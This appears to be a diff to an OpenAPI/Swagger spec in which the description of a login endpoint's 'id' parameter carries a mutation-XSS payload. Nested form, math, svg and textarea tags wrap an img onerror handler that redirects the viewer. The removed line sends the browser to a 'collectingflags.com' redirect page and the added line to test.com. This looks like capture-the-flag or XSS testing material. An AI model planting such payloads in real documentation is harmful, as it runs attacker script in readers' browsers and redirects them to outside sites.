@@ -18,7 +18,7 @@ paths:
       summary: Logs in
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=document.location="https://collectingflags.com/redirect.php" src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src="1" onerror="window.location.href = 'http://test.com'"</form>
           format: int64
           in: path
           name: id
